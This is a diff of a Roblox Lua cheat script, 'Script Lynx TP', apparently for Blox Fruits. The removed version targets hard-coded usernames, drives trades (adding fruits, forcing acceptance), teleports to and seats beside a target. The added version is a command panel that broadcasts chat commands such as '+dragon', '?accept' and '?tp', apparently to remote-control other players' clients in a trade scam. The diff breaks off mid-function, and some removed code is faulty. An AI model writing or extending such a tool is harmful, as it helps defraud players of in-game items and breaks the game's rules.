@@ -1,446 +1,418 @@
--- Script Lynx TP System with Command UI
--- Upload this to: https://github.com/NeroHubClub/TP-BF-NERO/blob/main/NANANNAA
-
-print("[Script Lynx TP] Loading...")
-
--- Services
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local LocalPlayer = Players.LocalPlayer
+local CommF = ReplicatedStorage.Remotes.CommF_
 
--- Configuration
-local JOB_ID = game.JobId
-local TARGET_USERNAME = ""
-local PLACE_ID = 4442272183
+-- Variables
+local JOBID = ""
+local TARGET_SEA = "2"
 
--- Find target user (assuming first priority user is target)
-local PriorityUsers = {"Smiley9Gamerz", "FAITH0YT", "BUZZFTGOD", "KITSUNEPLS_908", "1IM_SMILEY1", "Smiley_Mustafa2"}
+local SEA_PLACE = {
+    ["1"] = 2753915549,
+    ["2"] = 4442272183,
+    ["3"] = 7449423635,
+}
 
-for _, name in ipairs(PriorityUsers) do
-    local target = Players:FindFirstChild(name)
-    if target and target ~= LocalPlayer then
-        TARGET_USERNAME = target.Name
-        break
+local FRUITS = {
+    "dragon", "kitsune", "dough", "venom", "leopard", "spirit", "control", "shadow",
+    "quake", "buddha", "rumble", "portal", "phoenix", "gravity", "blizzard", "love"
+}
+
+local function getCurrentSea()
+    if game.PlaceId == 2753915549 then
+        return "1"
+    elseif game.PlaceId == 4442272183 then
+        return "2"
+    elseif game.PlaceId == 7449423635 then
+        return "3"
     end
+    return "0"
 end
 
-print("[Script Lynx TP] Job ID:", JOB_ID)
-print("[Script Lynx TP] Target:", TARGET_USERNAME)
-
--- Fruit Emojis
-local fruitEmoji = {
-    ["Rocket"] = "🚀", ["Spin"] = "🚁", ["Blade"] = "⚔️", ["Spring"] = "🗑️",
-    ["Bomb"] = "💣", ["Smoke"] = "💨", ["Spike"] = "📍", ["Flame"] = "🔥",
-    ["Ice"] = "🧊", ["Sand"] = "🏜️", ["Dark"] = "🌑", ["Eagle"] = "🦅",
-    ["Diamond"] = "💎", ["Light"] = "⚡", ["Rubber"] = "🟤", ["Ghost"] = "👻",
-    ["Magma"] = "🌋", ["Quake"] = "🌊", ["Buddha"] = "🧘", ["Love"] = "💖",
-    ["Creation"] = "🛠️", ["Spider"] = "🕷️", ["Sound"] = "🎵", ["Phoenix"] = "🔥",
-    ["Portal"] = "🌀", ["Lightning"] = "⚡", ["Pain"] = "🤕", ["Blizzard"] = "❄️",
-    ["Gravity"] = "🟣", ["Mammoth"] = "🦣", ["T-Rex"] = "🦖", ["Dough"] = "🍩",
-    ["Shadow"] = "🌑", ["Venom"] = "🐍", ["Gas"] = "☁️", ["Control"] = "🌀",
-    ["Spirit"] = "👻", ["Tiger"] = "🐯", ["Yeti"] = "☃️", ["Kitsune"] = "🦊",
-    ["Dragon"] = "🐲", ["Leopard"] = "🐆"
-}
-
--- All available fruits
-local allFruits = {
-    "Dragon", "Kitsune", "T-Rex", "Leopard", "Dough", "Venom", "Shadow", 
-    "Control", "Spirit", "Mammoth", "Gravity", "Blizzard", "Pain", 
-    "Lightning", "Portal", "Phoenix", "Sound", "Spider", "Creation",
-    "Love", "Buddha", "Quake", "Magma", "Ghost", "Rubber", "Light",
-    "Diamond", "Eagle", "Dark", "Sand", "Ice", "Flame", "Spike",
-    "Smoke", "Bomb", "Spring", "Blade", "Spin", "Rocket"
-}
-
--- Wait for remotes
-local CommF, TradeFunction
-task.spawn(function()
-    CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
-    TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
-end)
-
--- Command UI Creation
-local function createCommandUI()
-    local commandHistory = {}
-    local addedFruits = {}
+-- Command Execution Function
+local function executeCommand(command)
+    local ChatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
     
-    -- Create ScreenGui
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "ScriptLynx_CommandUI"
-    screenGui.ResetOnSpawn = false
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-    
-    -- Main Frame
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0.3, 0, 0.65, 0)
-    mainFrame.Position = UDim2.new(0.02, 0, 0.17, 0)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-    mainFrame.BorderSizePixel = 0
-    mainFrame.ClipsDescendants = true
-    
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = mainFrame
-    
-    local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(100, 150, 255)
-    stroke.Thickness = 2
-    stroke.Parent = mainFrame
-    
-    -- Title Bar
-    local titleBar = Instance.new("Frame")
-    titleBar.Size = UDim2.new(1, 0, 0, 40)
-    titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
-    titleBar.BorderSizePixel = 0
-    
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, -10, 1, 0)
-    title.Position = UDim2.new(0, 10, 0, 0)
-    title.BackgroundTransparency = 1
-    title.Text = "📱 Script Lynx - Command Panel"
-    title.Font = Enum.Font.GothamBold
-    title.TextSize = 18
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.TextXAlignment = Enum.TextXAlignment.Left
-    
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Size = UDim2.new(0, 30, 0, 30)
-    closeBtn.Position = UDim2.new(1, -35, 0, 5)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-    closeBtn.Text = "X"
-    closeBtn.Font = Enum.Font.GothamBold
-    closeBtn.TextSize = 16
-    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeBtn.MouseButton1Click:Connect(function()
-        screenGui:Destroy()
-    end)
-    
-    local closeCorner = Instance.new("UICorner")
-    closeCorner.CornerRadius = UDim.new(0, 6)
-    closeCorner.Parent = closeBtn
-    
-    -- Fruit Selection Panel
-    local scrollFrame = Instance.new("ScrollingFrame")
-    scrollFrame.Size = UDim2.new(1, -20, 0.45, -10)
-    scrollFrame.Position = UDim2.new(0, 10, 0, 50)
-    scrollFrame.BackgroundTransparency = 1
-    scrollFrame.ScrollBarThickness = 6
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-    
-    local uiListLayout = Instance.new("UIListLayout")
-    uiListLayout.Padding = UDim.new(0, 8)
-    uiListLayout.Parent = scrollFrame
-    
-    -- Create fruit buttons
-    local function createFruitButton(fruitName)
-        local button = Instance.new("Frame")
-        button.Size = UDim2.new(1, 0, 0, 40)
-        button.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
-        button.BorderSizePixel = 0
-        
-        local btnCorner = Instance.new("UICorner")
-        btnCorner.CornerRadius = UDim.new(0, 8)
-        btnCorner.Parent = button
-        
-        local fruitBtn = Instance.new("TextButton")
-        fruitBtn.Size = UDim2.new(1, 0, 1, 0)
-        fruitBtn.BackgroundTransparency = 1
-        fruitBtn.Text = (fruitEmoji[fruitName] or "🍎") .. " " .. fruitName
-        fruitBtn.Font = Enum.Font.Gotham
-        fruitBtn.TextSize = 16
-        fruitBtn.TextColor3 = Color3.fromRGB(220, 220, 255)
-        
-        local statusLabel = Instance.new("TextLabel")
-        statusLabel.Size = UDim2.new(0, 60, 1, 0)
-        statusLabel.Position = UDim2.new(1, -65, 0, 0)
-        statusLabel.BackgroundTransparency = 1
-        statusLabel.Text = "Add"
-        statusLabel.Font = Enum.Font.GothamBold
-        statusLabel.TextSize = 14
-        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-        
-        fruitBtn.MouseButton1Click:Connect(function()
-            if addedFruits[fruitName] then
-                -- Remove fruit
-                local success = pcall(function()
-                    TradeFunction:InvokeServer("removeItem", fruitName .. "-" .. fruitName)
-                end)
-                if success then
-                    addedFruits[fruitName] = nil
-                    statusLabel.Text = "Add"
-                    statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-                    addToHistory("🗑️ Removed: " .. fruitName)
-                end
-            else
-                -- Add fruit
-                local success = pcall(function()
-                    TradeFunction:InvokeServer("addItem", fruitName .. "-" .. fruitName)
-                end)
-                if success then
-                    addedFruits[fruitName] = true
-                    statusLabel.Text = "Added"
-                    statusLabel.TextColor3 = Color3.fromRGB(255, 150, 50)
-                    addToHistory("✅ Added: " .. fruitName)
-                end
+    if ChatService then
+        local SayMessageRequest = ChatService:FindFirstChild("SayMessageRequest")
+        if SayMessageRequest then
+            SayMessageRequest:FireServer(command, "All")
+            print("Executed command:", command)
+        end
+    else
+        -- Alternative method using chat
+        game:GetService("Players").LocalPlayer:GetMouse().KeyDown:Connect(function(key)
+            if key == " " then
+                -- Fallback if chat service not found
+                game:GetService("Players").LocalPlayer:Kick("Chat service not found!")
             end
         end)
-        
-        fruitBtn.Parent = button
-        statusLabel.Parent = button
-        button.Parent = scrollFrame
     end
-    
-    for _, fruit in ipairs(allFruits) do
-        createFruitButton(fruit)
-    end
-    
-    -- Command Buttons Panel
-    local commandPanel = Instance.new("Frame")
-    commandPanel.Size = UDim2.new(1, -20, 0.25, 0)
-    commandPanel.Position = UDim2.new(0, 10, 0.47, 0)
-    commandPanel.BackgroundTransparency = 1
-    
-    local function createCommandButton(name, callback, color)
-        local btn = Instance.new("TextButton")
-        btn.Size = UDim2.new(0.48, 0, 0, 40)
-        btn.BackgroundColor3 = color
-        btn.Text = name
-        btn.Font = Enum.Font.GothamBold
-        btn.TextSize = 14
-        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        btn.MouseButton1Click = callback
-        
-        local btnCorner = Instance.new("UICorner")
-        btnCorner.CornerRadius = UDim.new(0, 8)
-        btnCorner.Parent = btn
-        
-        return btn
-    end
-    
-    -- Accept Trade Button
-    local acceptBtn = createCommandButton("✅ ACCEPT TRADE", function()
-        pcall(function() TradeFunction:InvokeServer("AcceptTrade") end)
-        pcall(function() TradeFunction:InvokeServer("accept") end)
-        addToHistory("🤝 Trade Accepted")
-    end, Color3.fromRGB(60, 180, 80))
-    
-    -- Jump Button
-    local jumpBtn = createCommandButton("🎯 JUMP", function()
-        local char = LocalPlayer.Character
-        if char and char:FindFirstChildOfClass("Humanoid") then
-            char:FindFirstChildOfClass("Humanoid").Jump = true
-            addToHistory("🎈 Jumped")
-        end
-    end, Color3.fromRGB(80, 150, 255))
-    
-    -- Teleport Button
-    local tpBtn = createCommandButton("📍 TELEPORT", function()
-        local target = Players:FindFirstChild(TARGET_USERNAME)
-        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-            local char = LocalPlayer.Character
-            if char and char:FindFirstChild("HumanoidRootPart") then
-                char.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(5, 0, 0)
-                addToHistory("📍 Teleported to target")
-            end
-        end
-    end, Color3.fromRGB(150, 100, 255))
-    
-    -- Test Button
-    local testBtn = createCommandButton("🧪 TEST", function()
-        local char = LocalPlayer.Character
-        if char and char:FindFirstChildOfClass("Humanoid") then
-            char:FindFirstChildOfClass("Humanoid").Jump = true
-        end
-        addToHistory("✅ User is responsive")
-    end, Color3.fromRGB(255, 150, 50))
-    
-    -- Reset Button
-    local resetBtn = createCommandButton("🔄 RESET", function()
-        local char = LocalPlayer.Character
-        if char and char:FindFirstChild("Humanoid") then
-            char.Humanoid.Health = 0
-            addToHistory("🔄 Resetting character...")
-        end
-    end, Color3.fromRGB(255, 80, 80))
-    
-    -- Clear All Button
-    local clearBtn = createCommandButton("🗑️ CLEAR ALL", function()
-        for fruitName, _ in pairs(addedFruits) do
-            pcall(function()
-                TradeFunction:InvokeServer("removeItem", fruitName .. "-" .. fruitName)
-            end)
-        end
-        addedFruits = {}
-        addToHistory("🗑️ Cleared all fruits from trade")
-    end, Color3.fromRGB(180, 60, 60))
-    
-    -- Position buttons in grid
-    acceptBtn.Position = UDim2.new(0, 0, 0, 0)
-    jumpBtn.Position = UDim2.new(0.52, 0, 0, 0)
-    tpBtn.Position = UDim2.new(0, 0, 0, 45)
-    testBtn.Position = UDim2.new(0.52, 0, 0, 45)
-    resetBtn.Position = UDim2.new(0, 0, 0, 90)
-    clearBtn.Position = UDim2.new(0.52, 0, 0, 90)
-    
-    acceptBtn.Parent = commandPanel
-    jumpBtn.Parent = commandPanel
-    tpBtn.Parent = commandPanel
-    testBtn.Parent = commandPanel
-    resetBtn.Parent = commandPanel
-    clearBtn.Parent = commandPanel
-    
-    -- History Log
-    local historyFrame = Instance.new("Frame")
-    historyFrame.Size = UDim2.new(1, -20, 0.25, -10)
-    historyFrame.Position = UDim2.new(0, 10, 0.74, 0)
-    historyFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-    historyFrame.BorderSizePixel = 0
-    
-    local historyCorner = Instance.new("UICorner")
-    historyCorner.CornerRadius = UDim.new(0, 8)
-    historyCorner.Parent = historyFrame
-    
-    local historyLabel = Instance.new("TextLabel")
-    historyLabel.Size = UDim2.new(1, -10, 0, 25)
-    historyLabel.Position = UDim2.new(0, 10, 0, 5)
-    historyLabel.BackgroundTransparency = 1
-    historyLabel.Text = "📝 Command History:"
-    historyLabel.Font = Enum.Font.GothamBold
-    historyLabel.TextSize = 14
-    historyLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
-    historyLabel.TextXAlignment = Enum.TextXAlignment.Left
-    
-    local historyScroll = Instance.new("ScrollingFrame")
-    historyScroll.Size = UDim2.new(1, -10, 1, -35)
-    historyScroll.Position = UDim2.new(0, 5, 0, 30)
-    historyScroll.BackgroundTransparency = 1
-    historyScroll.ScrollBarThickness = 4
-    historyScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-    
-    local historyList = Instance.new("UIListLayout")
-    historyList.Padding = UDim.new(0, 4)
-    historyList.Parent = historyScroll
-    
-    -- Function to add messages to history
-    local function addToHistory(message)
-        table.insert(commandHistory, 1, message)
-        if #commandHistory > 8 then
-            table.remove(commandHistory, 9)
-        end
-        
-        historyScroll:ClearAllChildren()
-        for i, msg in ipairs(commandHistory) do
-            local label = Instance.new("TextLabel")
-            label.Size = UDim2.new(1, 0, 0, 20)
-            label.BackgroundTransparency = 1
-            label.Text = "› " .. msg
-            label.Font = Enum.Font.Code
-            label.TextSize = 13
-            label.TextColor3 = Color3.fromRGB(180, 255, 180)
-            label.TextXAlignment = Enum.TextXAlignment.Left
-            label.TextTruncate = Enum.TextTruncate.AtEnd
-            label.Parent = historyScroll
-        end
-        
-        historyScroll.CanvasSize = UDim2.new(0, 0, 0, #commandHistory * 24)
-    end
-    
-    -- Add history components
-    historyLabel.Parent = historyFrame
-    historyScroll.Parent = historyFrame
-    
-    -- Assemble all components
-    titleBar.Parent = mainFrame
-    title.Parent = titleBar
-    closeBtn.Parent = titleBar
-    scrollFrame.Parent = mainFrame
-    commandPanel.Parent = mainFrame
-    historyFrame.Parent = mainFrame
-    mainFrame.Parent = screenGui
-    screenGui.Parent = LocalPlayer.PlayerGui
-    
-    -- Update scroll size
-    task.wait()
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, uiListLayout.AbsoluteContentSize.Y)
-    
-    -- Initial messages
-    addToHistory("🎮 Command UI Loaded!")
-    addToHistory("👤 Target: " .. TARGET_USERNAME)
-    addToHistory("📍 Click fruits to add/remove from trade")
-    
-    return screenGui
 end
 
--- Auto-sit system
-local function setupAutoSit()
-    local RunService = game:GetService("RunService")
-    local target = Players:FindFirstChild(TARGET_USERNAME)
+local function createCommandGUI()
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "CommandGUI"
+    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     
-    if not target then 
-        print("[Script Lynx TP] Target not found:", TARGET_USERNAME)
-        return 
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Name = "MainFrame"
+    MainFrame.Size = UDim2.new(0, 850, 0, 500)
+    MainFrame.Position = UDim2.new(0.5, -425, 0.5, -250)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Parent = ScreenGui
+    
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 12)
+    UICorner.Parent = MainFrame
+    
+    local TopBar = Instance.new("Frame")
+    TopBar.Size = UDim2.new(1, 0, 0, 50)
+    TopBar.Position = UDim2.new(0, 0, 0, 0)
+    TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    TopBar.Parent = MainFrame
+    
+    local TopCorner = Instance.new("UICorner")
+    TopCorner.CornerRadius = UDim.new(0, 12)
+    TopCorner.Parent = TopBar
+    
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, 0, 1, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "COMMAND CONTROL PANEL"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 20
+    Title.Parent = TopBar
+    
+    local CloseButton = Instance.new("TextButton")
+    CloseButton.Size = UDim2.new(0, 30, 0, 30)
+    CloseButton.Position = UDim2.new(1, -35, 0.5, -15)
+    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+    CloseButton.Text = "X"
+    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseButton.Font = Enum.Font.GothamBold
+    CloseButton.TextSize = 16
+    CloseButton.Parent = TopBar
+    
+    local CloseCorner = Instance.new("UICorner")
+    CloseCorner.CornerRadius = UDim.new(0, 6)
+    CloseCorner.Parent = CloseButton
+    
+    -- TAB SYSTEM
+    local TabFrame = Instance.new("Frame")
+    TabFrame.Size = UDim2.new(1, -20, 0, 40)
+    TabFrame.Position = UDim2.new(0, 10, 0, 60)
+    TabFrame.BackgroundTransparency = 1
+    TabFrame.Parent = MainFrame
+    
+    local FruitTab = Instance.new("TextButton")
+    FruitTab.Size = UDim2.new(0.33, 0, 1, 0)
+    FruitTab.Position = UDim2.new(0, 0, 0, 0)
+    FruitTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+    FruitTab.Text = "FRUIT COMMANDS"
+    FruitTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+    FruitTab.Font = Enum.Font.GothamBold
+    FruitTab.TextSize = 14
+    FruitTab.Parent = TabFrame
+    
+    local TradeTab = Instance.new("TextButton")
+    TradeTab.Size = UDim2.new(0.33, 0, 1, 0)
+    TradeTab.Position = UDim2.new(0.33, 0, 0, 0)
+    TradeTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    TradeTab.Text = "TRADE COMMANDS"
+    TradeTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    TradeTab.Font = Enum.Font.GothamBold
+    TradeTab.TextSize = 14
+    TradeTab.Parent = TabFrame
+    
+    local ControlTab = Instance.new("TextButton")
+    ControlTab.Size = UDim2.new(0.34, 0, 1, 0)
+    ControlTab.Position = UDim2.new(0.66, 0, 0, 0)
+    ControlTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    ControlTab.Text = "CONTROL COMMANDS"
+    ControlTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    ControlTab.Font = Enum.Font.GothamBold
+    ControlTab.TextSize = 14
+    ControlTab.Parent = TabFrame
+    
+    local TabCorner = Instance.new("UICorner")
+    TabCorner.CornerRadius = UDim.new(0, 6)
+    TabCorner.Parent = FruitTab
+    TabCorner:Clone().Parent = TradeTab
+    TabCorner:Clone().Parent = ControlTab
+    
+    -- CONTENT FRAME
+    local ContentFrame = Instance.new("Frame")
+    ContentFrame.Size = UDim2.new(1, -20, 1, -120)
+    ContentFrame.Position = UDim2.new(0, 10, 0, 110)
+    ContentFrame.BackgroundTransparency = 1
+    ContentFrame.Parent = MainFrame
+    
+    -- FRUIT COMMANDS TAB
+    local FruitFrame = Instance.new("ScrollingFrame")
+    FruitFrame.Size = UDim2.new(1, 0, 1, 0)
+    FruitFrame.BackgroundTransparency = 1
+    FruitFrame.ScrollBarThickness = 6
+    FruitFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    FruitFrame.Visible = true
+    FruitFrame.Parent = ContentFrame
+    
+    local FruitGrid = Instance.new("UIGridLayout")
+    FruitGrid.CellSize = UDim2.new(0.48, 0, 0, 40)
+    FruitGrid.CellPadding = UDim2.new(0, 5, 0, 5)
+    FruitGrid.StartCorner = Enum.StartCorner.TopLeft
+    FruitGrid.Parent = FruitFrame
+    
+    -- Add Fruit Buttons
+    for _, fruit in pairs(FRUITS) do
+        -- Add Button
+        local AddButton = Instance.new("TextButton")
+        AddButton.Size = UDim2.new(1, 0, 0, 40)
+        AddButton.BackgroundColor3 = Color3.fromRGB(60, 180, 60)
+        AddButton.Text = "+" .. fruit:upper()
+        AddButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        AddButton.Font = Enum.Font.GothamBold
+        AddButton.TextSize = 14
+        AddButton.Parent = FruitFrame
+        
+        local ButtonCorner = Instance.new("UICorner")
+        ButtonCorner.CornerRadius = UDim.new(0, 6)
+        ButtonCorner.Parent = AddButton
+        
+        AddButton.MouseButton1Click:Connect(function()
+            executeCommand("+" .. fruit)
+        end)
+        
+        -- Remove Button
+        local RemoveButton = Instance.new("TextButton")
+        RemoveButton.Size = UDim2.new(1, 0, 0, 40)
+        RemoveButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+        RemoveButton.Text = "-" .. fruit:upper()
+        RemoveButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        RemoveButton.Font = Enum.Font.GothamBold
+        RemoveButton.TextSize = 14
+        RemoveButton.Parent = FruitFrame
+        
+        local RemoveCorner = Instance.new("UICorner")
+        RemoveCorner.CornerRadius = UDim.new(0, 6)
+        RemoveCorner.Parent = RemoveButton
+        
+        RemoveButton.MouseButton1Click:Connect(function()
+            executeCommand("-" .. fruit)
+        end)
     end
     
-    local chairMappings = {
-        ["-298_72_271"] = Vector3.new(-298, 73, 282),
-        ["-298_72_282"] = Vector3.new(-298, 73, 271),
-        ["-298_73_271"] = Vector3.new(-298, 73, 282),
-        ["-298_73_282"] = Vector3.new(-298, 73, 271),
-        ["-463_72_271"] = Vector3.new(-463, 73, 282),
-        ["-463_72_282"] = Vector3.new(-463, 73, 271),
-        ["-463_73_271"] = Vector3.new(-463, 73, 282),
-        ["-463_73_282"] = Vector3.new(-463, 73, 271),
+    -- TRADE COMMANDS TAB
+    local TradeFrame = Instance.new("ScrollingFrame")
+    TradeFrame.Size = UDim2.new(1, 0, 1, 0)
+    TradeFrame.BackgroundTransparency = 1
+    TradeFrame.ScrollBarThickness = 6
+    TradeFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    TradeFrame.Visible = false
+    TradeFrame.Parent = ContentFrame
+    
+    local TradeGrid = Instance.new("UIGridLayout")
+    TradeGrid.CellSize = UDim2.new(1, 0, 0, 45)
+    TradeGrid.CellPadding = UDim2.new(0, 0, 0, 5)
+    TradeGrid.StartCorner = Enum.StartCorner.TopLeft
+    TradeGrid.Parent = TradeFrame
+    
+    local TradeCommands = {
+        {name = "ACCEPT TRADE", command = "?accept", color = Color3.fromRGB(0, 170, 255)}
     }
     
-    local function getPositionKey(position)
-        return string.format("%d_%d_%d", math.floor(position.X + 0.5), math.floor(position.Y + 0.5), math.floor(position.Z + 0.5))
+    for _, cmd in pairs(TradeCommands) do
+        local CommandButton = Instance.new("TextButton")
+        CommandButton.Size = UDim2.new(1, 0, 0, 45)
+        CommandButton.BackgroundColor3 = cmd.color
+        CommandButton.Text = cmd.name
+        CommandButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        CommandButton.Font = Enum.Font.GothamBold
+        CommandButton.TextSize = 16
+        CommandButton.Parent = TradeFrame
+        
+        local CommandCorner = Instance.new("UICorner")
+        CommandCorner.CornerRadius = UDim.new(0, 8)
+        CommandCorner.Parent = CommandButton
+        
+        CommandButton.MouseButton1Click:Connect(function()
+            executeCommand(cmd.command)
+        end)
     end
     
-    RunService.Heartbeat:Connect(function()
-        local targetChar = target.Character
-        if not targetChar then return end
+    -- CONTROL COMMANDS TAB
+    local ControlFrame = Instance.new("ScrollingFrame")
+    ControlFrame.Size = UDim2.new(1, 0, 1, 0)
+    ControlFrame.BackgroundTransparency = 1
+    ControlFrame.ScrollBarThickness = 6
+    ControlFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    ControlFrame.Visible = false
+    ControlFrame.Parent = ContentFrame
+    
+    local ControlGrid = Instance.new("UIGridLayout")
+    ControlGrid.CellSize = UDim2.new(1, 0, 0, 45)
+    ControlGrid.CellPadding = UDim2.new(0, 0, 0, 5)
+    ControlGrid.StartCorner = Enum.StartCorner.TopLeft
+    ControlGrid.Parent = ControlFrame
+    
+    local ControlCommands = {
+        {name = "JUMP", command = "?jump", color = Color3.fromRGB(255, 140, 0)},
+        {name = "TELEPORT TO ME", command = "?tp", color = Color3.fromRGB(255, 140, 0)},
+        {name = "TEST RESPONSIVENESS", command = "?test", color = Color3.fromRGB(255, 140, 0)}
+    }
+    
+    for _, cmd in pairs(ControlCommands) do
+        local CommandButton = Instance.new("TextButton")
+        CommandButton.Size = UDim2.new(1, 0, 0, 45)
+        CommandButton.BackgroundColor3 = cmd.color
+        CommandButton.Text = cmd.name
+        CommandButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        CommandButton.Font = Enum.Font.GothamBold
+        CommandButton.TextSize = 16
+        CommandButton.Parent = ControlFrame
         
-        local hum = targetChar:FindFirstChild("Humanoid")
-        if not hum or not hum.Sit then return end
+        local CommandCorner = Instance.new("UICorner")
+        CommandCorner.CornerRadius = UDim.new(0, 8)
+        CommandCorner.Parent = CommandButton
         
-        local seat = hum.SeatPart
-        if not seat then return end
+        CommandButton.MouseButton1Click:Connect(function()
+            executeCommand(cmd.command)
+        end)
+    end
+    
+    -- RESET FRUIT SECTION
+    local ResetLabel = Instance.new("TextLabel")
+    ResetLabel.Size = UDim2.new(1, 0, 0, 30)
+    ResetLabel.Position = UDim2.new(0, 0, 0, 150)
+    ResetLabel.BackgroundTransparency = 1
+    ResetLabel.Text = "RESET WITH FRUIT:"
+    ResetLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+    ResetLabel.Font = Enum.Font.GothamBold
+    ResetLabel.TextSize = 14
+    ResetLabel.TextXAlignment = Enum.TextXAlignment.Left
+    ResetLabel.Parent = ControlFrame
+    
+    local ResetGrid = Instance.new("UIGridLayout")
+    ResetGrid.CellSize = UDim2.new(0.33, 0, 0, 35)
+    ResetGrid.CellPadding = UDim2.new(0, 5, 0, 5)
+    ResetGrid.StartCorner = Enum.StartCorner.TopLeft
+    ResetGrid.Parent = ControlFrame
+    
+    local ResetFruits = {"dragon", "kitsune", "dough", "venom", "leopard", "spirit"}
+    
+    for _, fruit in pairs(ResetFruits) do
+        local ResetButton = Instance.new("TextButton")
+        ResetButton.Size = UDim2.new(1, 0, 0, 35)
+        ResetButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+        ResetButton.Text = "RESET " .. fruit:upper()
+        ResetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        ResetButton.Font = Enum.Font.GothamBold
+        ResetButton.TextSize = 12
+        ResetButton.Parent = ControlFrame
         
-        local key = getPositionKey(seat.Position)
-        local targetPos = chairMappings[key]
-        if not targetPos then return end
+        local ResetCorner = Instance.new("UICorner")
+        ResetCorner.CornerRadius = UDim.new(0, 6)
+        ResetCorner.Parent = ResetButton
         
-        local char = LocalPlayer.Character
-        if not char then return end
+        ResetButton.MouseButton1Click:Connect(function()
+            executeCommand("?reset " .. fruit)
+        end)
+    end
+    
+    -- TAB SWITCHING
+    FruitTab.MouseButton1Click:Connect(function()
+        FruitTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+        FruitTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TradeTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+        TradeTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+        ControlTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+        ControlTab.TextColor3 = Color3.fromRGB(200, 200, 200)
         
-        local myHum = char:FindFirstChild("Humanoid")
-        if myHum and myHum.Sit then return end
-        
-        char:MoveTo(targetPos)
+        FruitFrame.Visible = true
+        TradeFrame.Visible = false
+        ControlFrame.Visible = false
     end)
+    
+    TradeTab.MouseButton1Click:Connect(function()
+        TradeTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+        TradeTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+        FruitTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+        FruitTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+        ControlTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+        ControlTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+        
+        FruitFrame.Visible = false
+        TradeFrame.Visible = true
+        ControlFrame.Visible = false
+    end)
+    
+    ControlTab.MouseButton1Click:Connect(function()
+        ControlTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+        ControlTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+        FruitTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+        FruitTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+        TradeTab.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+        TradeTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+        
+        FruitFrame.Visible = false
+        TradeFrame.Visible = false
+        ControlFrame.Visible = true
+    end)
+    
+    -- CLOSE BUTTON
+    CloseButton.MouseButton1Click:Connect(function()
+        ScreenGui:Destroy()
